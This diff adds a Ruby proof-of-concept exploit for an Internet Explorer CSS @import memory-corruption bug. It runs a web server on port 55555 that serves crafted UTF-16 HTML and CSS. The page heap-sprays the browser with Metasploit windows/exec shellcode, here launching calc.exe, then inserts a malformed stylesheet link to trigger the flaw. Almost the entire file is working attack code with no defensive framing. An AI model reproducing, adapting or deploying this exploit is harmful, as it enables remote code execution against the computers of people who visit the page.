@@ -1,0 +1,164 @@
+#!/usr/bin/env ruby
+
+# Source: http://www.breakingpointsystems.com/community/blog/ie-vulnerability/
+# Author: Nephi Johnson (d0c_s4vage)
+
+require 'socket'
+ 
+def http_send(sock, data, opts={})
+    defaults = {:code=>"200", :message=>"OK", :type=>"text/html"}
+    opts = defaults.merge(opts)
+    
+    code = opts[:code]
+    message = opts[:message]
+    type = opts[:type]
+    
+    to_send = "HTTP/1.1 #{code} #{message}\r\n" +
+              "Date: Sat, 11 Dec 2010 14:20:23 GMT\r\n" +
+              "Cache-Control: no-cache\r\n" +
+              "Content-Type: #{type}\r\n" +
+              "Pragma: no-cache\r\n" +
+              "Content-Length: #{data.length}\r\n\r\n" +
+              "#{data}"
+    puts "[+] Sending:"
+    to_send.split("\n").each do |line|
+        puts "    #{line}"
+    end
+    sock.write(to_send) rescue return false
+    return true
+end
+ 
+def sock_read(sock, out_str, timeout=5)
+    begin
+        if Kernel.select([sock],[],[],timeout)
+            out_str.replace(sock.recv(1024))
+            puts "[+] Received:"
+            out_str.split("\n").each do |line|
+                puts "    #{line}"
+            end
+        else
+            sock.close
+            return false
+        end
+    rescue Exception => ex
+        return false
+    end
+end
+ 
+def to_uni(str)
+    res = ""
+    str.each_byte do |b|
+        res << "\x00#{b.chr}"
+    end
+    res
+end
+ 
+@css_name = "\x00s\x03s\x00s\x03s\x00s\x03s\x00s\x03s"
+@html_name = "test.html"
+placeholder = "a" * (@css_name.length/2)
+ 
+@html = <<-HTML
+    <script>
+    function dup_str(str, length) {
+        var res = str;
+        while(res.length < length) {
+            res += res;
+        }
+        res = res.substr(res.length - length);
+        return res;
+    }
+    
+    function to_bin(str) {
+        var res = "";
+        while(str.length > 0) {
+            var first = str.substr(0, 2);
+            var second = str.substr(2, 2);
+            res += "%u" + second + first;
+            str = (str.length > 4) ? str.substr(4) : "";
+        }
+        return unescape(res);
+    }
+ 
+    // first heap spray
+    var base = dup_str(to_bin("0c0c0c0900000008000000730073030100000000010000730073030c"), 512+6);
+    var arr = []
+    for(var i = 0; i < 60000; i++) {
+        arr[i] = ["" + base].join("");
+    }
+    
+    // second heap spray w/ shellcode
+    var nops = dup_str(to_bin("0c0c0c0c"), 4096+6);
+    
+    // windows/exec - 200 bytes
+    // http://www.metasploit.com
+    // EXITFUNC=process, CMD=calc.exe
+    var shellcode = unescape("%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30" + 
+                             "%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031" + 
+                             "%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752" + 
+                             "%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a" + 
+                             "%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34" + 
+                             "%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475" + 
+                             "%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66" + 
+                             "%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424" + 
+                             "%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86" + 
+                             "%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff" + 
+                             "%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c" + 
+                             "%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5" + 
+                             "%u6c61%u2e63%u7865%u0065");
+    var arr2 = [];
+    for(var i = 0; i < 30000; i++) {
+        arr2[i] = [nops + shellcode].join("");
+    }
+    
+    // write the link to the stylesheet
+    var link = document.createElement("link");
+    link.setAttribute("rel", "Stylesheet");
+    link.setAttribute("type", "text/css");
+    link.setAttribute("href", "#{placeholder}")
+    document.getElementsByTagName("head")[0].appendChild(link);
+    </script>
+HTML
+@html = "\xfe\xff" + to_uni(@html)
+@html.gsub!(to_uni(placeholder), @css_name)
+ 
+@css = <<-CSS
+@import url("#{placeholder}");
+@import url("#{placeholder}");
+@import url("#{placeholder}");
+@import url("#{placeholder}");
+CSS
+@css = "\xfe\xff" + to_uni(@css)
+@css.gsub!(to_uni(placeholder), @css_name)
+ 
+@index = <<-INDEX
+<a href="#{@html_name}">#{@html_name}</a>
+INDEX
+ 
+TCPServer.open(55555) do |srv|
+    while true
+        cli = srv.accept
+        req = ""
+        html = ""
+        css = ""
+        index = ""
+        next unless sock_read(cli, req, 5)
+        while req.length > 0
+            if req =~ /GET/
+                if req =~ /GET.*#{Regexp.escape(@html_name)}/
+                    break unless http_send(cli, @html, :type=>"text/html")
+                elsif req =~ /GET.*index/
+                    break unless http_send(cli, @index)
+                elsif req =~ /GET.*#{Regexp.escape(@css_name)}/
+                    break unless http_send(cli, @css, :type=>"text/css")
+                else
+                    break unless http_send(cli, @css, :type=>"text/css")
+                end
+            elsif req =~ /QUIT/
+                exit()
+            end
+            req = ""
+            next unless sock_read(cli, req, 5)
+        end
+        cli.close rescue next
+    end
+end
